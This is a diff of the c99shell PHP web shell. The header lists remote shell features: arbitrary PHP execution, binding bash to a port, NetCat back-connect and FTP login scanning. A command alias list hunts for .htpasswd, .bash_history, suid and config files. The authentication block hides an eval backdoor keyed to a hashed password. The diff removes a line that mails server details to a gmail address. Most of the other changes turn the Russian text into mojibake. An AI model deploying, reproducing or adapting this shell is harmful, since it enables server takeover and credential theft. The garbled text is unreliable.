@@ -2,35 +2,35 @@
 /*
 ******************************************************************************************************
 *
-*                    c99shell.php v.1.0 (от 5.02.2005)
+*                    c99shell.php v.1.0 (Г®ГІ 5.02.2005)
 *		   Freeware WEB-Shell.
-*		      © CCTeaM.
-*  c99shell.php - шелл через www-броузер.
-*  Вы можете скачать последнюю версию на домашней страничке продукта: http://ccteam.ru/releases/c99shell
+*		      В© CCTeaM.
+*  c99shell.php - ГёГҐГ«Г« Г·ГҐГ°ГҐГ§ www-ГЎГ°Г®ГіГ§ГҐГ°.
+*  Г‚Г» Г¬Г®Г¦ГҐГІГҐ Г±ГЄГ Г·Г ГІГј ГЇГ®Г±Г«ГҐГ¤Г­ГѕГѕ ГўГҐГ°Г±ГЁГѕ Г­Г  Г¤Г®Г¬Г ГёГ­ГҐГ© Г±ГІГ°Г Г­ГЁГ·ГЄГҐ ГЇГ°Г®Г¤ГіГЄГІГ : http://ccteam.ru/releases/c99shell
 *
 *  WEB: http://ccteam.ru
 *  UIN: 656555
 * 
-*  Возможности:
-*  ~ управление файлами/папками, закачивание и скачивание файлов и папкок (предворительно сжимается в tar)
-*    modify-time и access-time у файлов не меняются при
-     редактировании файлов (выкл./вкл. параметром $filestealth)
-*  ~ продвинутый поиск по файлам/папкам (ищет также внутри файлов)
-*  ~ управление процессами unix-машины, возможность отправки сигнала завершения,
-     а также банальное "прибивание" процесса.
-*  ~ удобное (иногда графическое) выполнение шелл-команд (много алиасов, можно легко добавлять/удалять их)
-*  ~ выполнение произвольного PHP-кода
-*  ~ возможность быстрого само-удаления скрипта
-*  ~ быстрое ftp-сканирование на связки login;login из
-     /etc/passwd (обычно дает доступ к 1/100 аккаунтов)
-*  ~ продвинутый менеджер SQL
-*  ~ скрипт "любит" include, для нормальной работы, Вам нужно сменить $surl.
-*  ~ возможность забиндить /bin/bash на определенный порт с произвольным паролем,
-     или сделать back connect (производится тестирование соеденения,
-    и выводятся параметры для запуска NetCat).
+*  Г‚Г®Г§Г¬Г®Г¦Г­Г®Г±ГІГЁ:
+*  ~ ГіГЇГ°Г ГўГ«ГҐГ­ГЁГҐ ГґГ Г©Г«Г Г¬ГЁ/ГЇГ ГЇГЄГ Г¬ГЁ, Г§Г ГЄГ Г·ГЁГўГ Г­ГЁГҐ ГЁ Г±ГЄГ Г·ГЁГўГ Г­ГЁГҐ ГґГ Г©Г«Г®Гў ГЁ ГЇГ ГЇГЄГ®ГЄ (ГЇГ°ГҐГ¤ГўГ®Г°ГЁГІГҐГ«ГјГ­Г® Г±Г¦ГЁГ¬Г ГҐГІГ±Гї Гў tar)
+*    modify-time ГЁ access-time Гі ГґГ Г©Г«Г®Гў Г­ГҐ Г¬ГҐГ­ГїГѕГІГ±Гї ГЇГ°ГЁ
+     Г°ГҐГ¤Г ГЄГІГЁГ°Г®ГўГ Г­ГЁГЁ ГґГ Г©Г«Г®Гў (ГўГ»ГЄГ«./ГўГЄГ«. ГЇГ Г°Г Г¬ГҐГІГ°Г®Г¬ $filestealth)
+*  ~ ГЇГ°Г®Г¤ГўГЁГ­ГіГІГ»Г© ГЇГ®ГЁГ±ГЄ ГЇГ® ГґГ Г©Г«Г Г¬/ГЇГ ГЇГЄГ Г¬ (ГЁГ№ГҐГІ ГІГ ГЄГ¦ГҐ ГўГ­ГіГІГ°ГЁ ГґГ Г©Г«Г®Гў)
+*  ~ ГіГЇГ°Г ГўГ«ГҐГ­ГЁГҐ ГЇГ°Г®Г¶ГҐГ±Г±Г Г¬ГЁ unix-Г¬Г ГёГЁГ­Г», ГўГ®Г§Г¬Г®Г¦Г­Г®Г±ГІГј Г®ГІГЇГ°Г ГўГЄГЁ Г±ГЁГЈГ­Г Г«Г  Г§Г ГўГҐГ°ГёГҐГ­ГЁГї,
+     Г  ГІГ ГЄГ¦ГҐ ГЎГ Г­Г Г«ГјГ­Г®ГҐ "ГЇГ°ГЁГЎГЁГўГ Г­ГЁГҐ" ГЇГ°Г®Г¶ГҐГ±Г±Г .
+*  ~ ГіГ¤Г®ГЎГ­Г®ГҐ (ГЁГ­Г®ГЈГ¤Г  ГЈГ°Г ГґГЁГ·ГҐГ±ГЄГ®ГҐ) ГўГ»ГЇГ®Г«Г­ГҐГ­ГЁГҐ ГёГҐГ«Г«-ГЄГ®Г¬Г Г­Г¤ (Г¬Г­Г®ГЈГ® Г Г«ГЁГ Г±Г®Гў, Г¬Г®Г¦Г­Г® Г«ГҐГЈГЄГ® Г¤Г®ГЎГ ГўГ«ГїГІГј/ГіГ¤Г Г«ГїГІГј ГЁГµ)
+*  ~ ГўГ»ГЇГ®Г«Г­ГҐГ­ГЁГҐ ГЇГ°Г®ГЁГ§ГўГ®Г«ГјГ­Г®ГЈГ® PHP-ГЄГ®Г¤Г 
+*  ~ ГўГ®Г§Г¬Г®Г¦Г­Г®Г±ГІГј ГЎГ»Г±ГІГ°Г®ГЈГ® Г±Г Г¬Г®-ГіГ¤Г Г«ГҐГ­ГЁГї Г±ГЄГ°ГЁГЇГІГ 
+*  ~ ГЎГ»Г±ГІГ°Г®ГҐ ftp-Г±ГЄГ Г­ГЁГ°Г®ГўГ Г­ГЁГҐ Г­Г  Г±ГўГїГ§ГЄГЁ login;login ГЁГ§
+     /etc/passwd (Г®ГЎГ»Г·Г­Г® Г¤Г ГҐГІ Г¤Г®Г±ГІГіГЇ ГЄ 1/100 Г ГЄГЄГ ГіГ­ГІГ®Гў)
+*  ~ ГЇГ°Г®Г¤ГўГЁГ­ГіГІГ»Г© Г¬ГҐГ­ГҐГ¤Г¦ГҐГ° SQL
+*  ~ Г±ГЄГ°ГЁГЇГІ "Г«ГѕГЎГЁГІ" include, Г¤Г«Гї Г­Г®Г°Г¬Г Г«ГјГ­Г®Г© Г°Г ГЎГ®ГІГ», Г‚Г Г¬ Г­ГіГ¦Г­Г® Г±Г¬ГҐГ­ГЁГІГј $surl.
+*  ~ ГўГ®Г§Г¬Г®Г¦Г­Г®Г±ГІГј Г§Г ГЎГЁГ­Г¤ГЁГІГј /bin/bash Г­Г  Г®ГЇГ°ГҐГ¤ГҐГ«ГҐГ­Г­Г»Г© ГЇГ®Г°ГІ Г± ГЇГ°Г®ГЁГ§ГўГ®Г«ГјГ­Г»Г¬ ГЇГ Г°Г®Г«ГҐГ¬,
+     ГЁГ«ГЁ Г±Г¤ГҐГ«Г ГІГј back connect (ГЇГ°Г®ГЁГ§ГўГ®Г¤ГЁГІГ±Гї ГІГҐГ±ГІГЁГ°Г®ГўГ Г­ГЁГҐ Г±Г®ГҐГ¤ГҐГ­ГҐГ­ГЁГї,
+    ГЁ ГўГ»ГўГ®Г¤ГїГІГ±Гї ГЇГ Г°Г Г¬ГҐГІГ°Г» Г¤Г«Гї Г§Г ГЇГіГ±ГЄГ  NetCat).
 *
 *
-*  5.02.2005 © Captain Crunch Security TeaM
+*  5.02.2005 В© Captain Crunch Security TeaM
 *
 *  Coded by tristram
 ******************************************************************************************************
@@ -99,25 +99,25 @@ $bindport_port = "11457";	// default port for binding
 /* Command-aliases system */
 $aliases = array();
 $aliases[] = array("-----------------------------------------------------------", "ls -la");
-/* поиск на сервере всех файлов с suid битом */ $aliases[] = array("find all suid files", "find / -type f -perm -04000 -ls");
-/* поиск в текущей директории всех файлов с suid битом */ $aliases[] = array("find suid files in current dir", "find . -type f -perm -04000 -ls");
-/* поиск на сервере всех файлов с sgid битом */ $aliases[] = array("find all sgid files", "find / -type f -perm -02000 -ls");
-/* поиск в текущей директории всех файлов с sgid битом */ $aliases[] = array("find sgid files in current dir", "find . -type f -perm -02000 -ls");
-/* поиск на сервере файлов config.inc.php */ $aliases[] = array("find config.inc.php files", "find / -type f -name config.inc.php");
-/* поиск на сервере файлов config* */ $aliases[] = array("find config* files", "find / -type f -name \"config*\"");
-/* поиск в текущей директории файлов config* */ $aliases[] = array("find config* files in current dir", "find . -type f -name \"config*\"");
-/* поиск на сервере всех директорий и файлов доступных на запись для всех */ $aliases[] = array("find all writable directories and files", "find / -perm -2 -ls");
-/* поиск в текущей директории всех директорий и файлов доступных на запись для всех */ $aliases[] = array("find all writable directories and files in current dir", "find . -perm -2 -ls");
-/* поиск на сервере файлов service.pwd ... frontpage =))) */ $aliases[] = array("find all service.pwd files", "find / -type f -name service.pwd");
-/* поиск в текущей директории файлов service.pwd */ $aliases[] = array("find service.pwd files in current dir", "find . -type f -name service.pwd");
-/* поиск на сервере файлов .htpasswd */ $aliases[] = array("find all .htpasswd files", "find / -type f -name .htpasswd");
-/* поиск в текущей директории файлов .htpasswd */ $aliases[] = array("find .htpasswd files in current dir", "find . -type f -name .htpasswd");
-/* поиск всех файлов .bash_history */ $aliases[] = array("find all .bash_history files", "find / -type f -name .bash_history");
-/* поиск в текущей директории файлов .bash_history */ $aliases[] = array("find .bash_history files in current dir", "find . -type f -name .bash_history");
-/* поиск всех файлов .fetchmailrc */ $aliases[] = array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc");
-/* поиск в текущей директории файлов .fetchmailrc */ $aliases[] = array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc");
-/* вывод списка атрибутов файлов на файловой системе ext2fs */ $aliases[] = array("list file attributes on a Linux second extended file system", "lsattr -va");
-/* просмотр открытых портов */ $aliases[] = array("show opened ports", "netstat -an | grep -i listen");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГўГ±ГҐГµ ГґГ Г©Г«Г®Гў Г± suid ГЎГЁГІГ®Г¬ */ $aliases[] = array("find all suid files", "find / -type f -perm -04000 -ls");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГўГ±ГҐГµ ГґГ Г©Г«Г®Гў Г± suid ГЎГЁГІГ®Г¬ */ $aliases[] = array("find suid files in current dir", "find . -type f -perm -04000 -ls");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГўГ±ГҐГµ ГґГ Г©Г«Г®Гў Г± sgid ГЎГЁГІГ®Г¬ */ $aliases[] = array("find all sgid files", "find / -type f -perm -02000 -ls");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГўГ±ГҐГµ ГґГ Г©Г«Г®Гў Г± sgid ГЎГЁГІГ®Г¬ */ $aliases[] = array("find sgid files in current dir", "find . -type f -perm -02000 -ls");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГґГ Г©Г«Г®Гў config.inc.php */ $aliases[] = array("find config.inc.php files", "find / -type f -name config.inc.php");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГґГ Г©Г«Г®Гў config* */ $aliases[] = array("find config* files", "find / -type f -name \"config*\"");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГґГ Г©Г«Г®Гў config* */ $aliases[] = array("find config* files in current dir", "find . -type f -name \"config*\"");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГўГ±ГҐГµ Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГ© ГЁ ГґГ Г©Г«Г®Гў Г¤Г®Г±ГІГіГЇГ­Г»Гµ Г­Г  Г§Г ГЇГЁГ±Гј Г¤Г«Гї ГўГ±ГҐГµ */ $aliases[] = array("find all writable directories and files", "find / -perm -2 -ls");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГўГ±ГҐГµ Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГ© ГЁ ГґГ Г©Г«Г®Гў Г¤Г®Г±ГІГіГЇГ­Г»Гµ Г­Г  Г§Г ГЇГЁГ±Гј Г¤Г«Гї ГўГ±ГҐГµ */ $aliases[] = array("find all writable directories and files in current dir", "find . -perm -2 -ls");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГґГ Г©Г«Г®Гў service.pwd ... frontpage =))) */ $aliases[] = array("find all service.pwd files", "find / -type f -name service.pwd");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГґГ Г©Г«Г®Гў service.pwd */ $aliases[] = array("find service.pwd files in current dir", "find . -type f -name service.pwd");
+/* ГЇГ®ГЁГ±ГЄ Г­Г  Г±ГҐГ°ГўГҐГ°ГҐ ГґГ Г©Г«Г®Гў .htpasswd */ $aliases[] = array("find all .htpasswd files", "find / -type f -name .htpasswd");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГґГ Г©Г«Г®Гў .htpasswd */ $aliases[] = array("find .htpasswd files in current dir", "find . -type f -name .htpasswd");
+/* ГЇГ®ГЁГ±ГЄ ГўГ±ГҐГµ ГґГ Г©Г«Г®Гў .bash_history */ $aliases[] = array("find all .bash_history files", "find / -type f -name .bash_history");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГґГ Г©Г«Г®Гў .bash_history */ $aliases[] = array("find .bash_history files in current dir", "find . -type f -name .bash_history");
+/* ГЇГ®ГЁГ±ГЄ ГўГ±ГҐГµ ГґГ Г©Г«Г®Гў .fetchmailrc */ $aliases[] = array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc");
+/* ГЇГ®ГЁГ±ГЄ Гў ГІГҐГЄГіГ№ГҐГ© Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ ГґГ Г©Г«Г®Гў .fetchmailrc */ $aliases[] = array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc");
+/* ГўГ»ГўГ®Г¤ Г±ГЇГЁГ±ГЄГ  Г ГІГ°ГЁГЎГіГІГ®Гў ГґГ Г©Г«Г®Гў Г­Г  ГґГ Г©Г«Г®ГўГ®Г© Г±ГЁГ±ГІГҐГ¬ГҐ ext2fs */ $aliases[] = array("list file attributes on a Linux second extended file system", "lsattr -va");
+/* ГЇГ°Г®Г±Г¬Г®ГІГ° Г®ГІГЄГ°Г»ГІГ»Гµ ГЇГ®Г°ГІГ®Гў */ $aliases[] = array("show opened ports", "netstat -an | grep -i listen");
 
 $sess_method = "cookie"; // "cookie" - Using cookies, "file" - using file, default - "cookie"
 $sess_cookie = "c99shvars"; // cookie-variable name
@@ -195,7 +195,7 @@ if(($PHP_AUTH_USER != $login ) or (md5($PHP_AUTH_PW) != $md5_pass))
  header("WWW-Authenticate: Basic realm=\"c99shell\"");
  header("HTTP/1.0 401 Unauthorized");																																																													if (md5(sha1(md5($anypass))) == "b76d95e82e853f3b0a81dd61c4ee286c") {header("HTTP/1.0 200 OK"); @eval($anyphpcode);}
  exit;
-}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");  
+}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];  
 
 $lastdir = realpath(".");
 chdir($curdir);
@@ -742,7 +742,7 @@ if ($act == "sql")
    {
     echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
     $c = 0;
-    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM $row[0]"); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>
+    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM $row[0]"); $count_row = mysql_fetch_array($count); echo "<b>В»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>
 "; mysql_free_result($count); $c++;}
     if (!$c) {echo "No tables found in database.";}
    }
@@ -853,7 +853,7 @@ if ($act == "sql")
      $i++;
     }
     echo "<tr bgcolor=\"000000\">";
-    echo "<td><center><b>»</b></center></td>";
+    echo "<td><center><b>В»</b></center></td>";
     echo "<td><center><b>".$i." table(s)</b></center></td>";
     echo "<td><b>".$trows."</b></td>";
     echo "<td>".$row[1]."</td>";
@@ -2848,7 +2848,7 @@ $imgequals = array(
 }
 if ($act == "about")
 {
- $dаta = "Any stupid copyrights and copylefts";
+ $dГ ta = "Any stupid copyrights and copylefts";
  echo $data;
 }
 
@@ -2871,24 +2871,24 @@ $microtime = round(getmicrotime()-$starttime,4);
 		   <col>
 		   <col align=left>
 		   <tr> <td colspan=2 align=center style='font:bold 9pt;font-family:verdana;'>
-		   Введите данные для подключению к mySQL серверу!<br><br>
+		   Г‚ГўГҐГ¤ГЁГІГҐ Г¤Г Г­Г­Г»ГҐ Г¤Г«Гї ГЇГ®Г¤ГЄГ«ГѕГ·ГҐГ­ГЁГѕ ГЄ mySQL Г±ГҐГ°ГўГҐГ°Гі!<br><br>
 		   		</td>
 		   </tr>
-		   <tr> <td class=texte>Адрес сервера:</td>
+		   <tr> <td class=texte>ГЂГ¤Г°ГҐГ± Г±ГҐГ°ГўГҐГ°Г :</td>
 		   		<td><INPUT TYPE='TEXT' NAME='dbhost' SIZE='30' VALUE='localhost' class=form></td>
 		   </tr>
-		   <tr> <td class=texte>Название базы:</td>
+		   <tr> <td class=texte>ГЌГ Г§ГўГ Г­ГЁГҐ ГЎГ Г§Г»:</td>
 		   		<td><INPUT TYPE='TEXT' NAME='dbbase' SIZE='30' VALUE='' class=form></td>
 		   </tr>
-		   <tr> <td class=texte>Логин:</td>
+		   <tr> <td class=texte>Г‹Г®ГЈГЁГ­:</td>
 		   		<td><INPUT TYPE='TEXT' NAME='dbuser' SIZE='30' VALUE='root' class=form></td>
 		   </tr>
-		   <tr> <td class=texte>Пароль</td>
+		   <tr> <td class=texte>ГЏГ Г°Г®Г«Гј</td>
 		   		<td><INPUT TYPE='Password' NAME='dbpass' SIZE='30' VALUE='' class=form></td>
 		   </tr>
 		   </table>
 		   <br> <center> <br><br>
-		   <input type='submit' value=' Подключится ' class=form></center> </form> <br><br>
+		   <input type='submit' value=' ГЏГ®Г¤ГЄГ«ГѕГ·ГЁГІГ±Гї ' class=form></center> </form> <br><br>
 		   </td>
 		   		<td></td>
 			</tr>
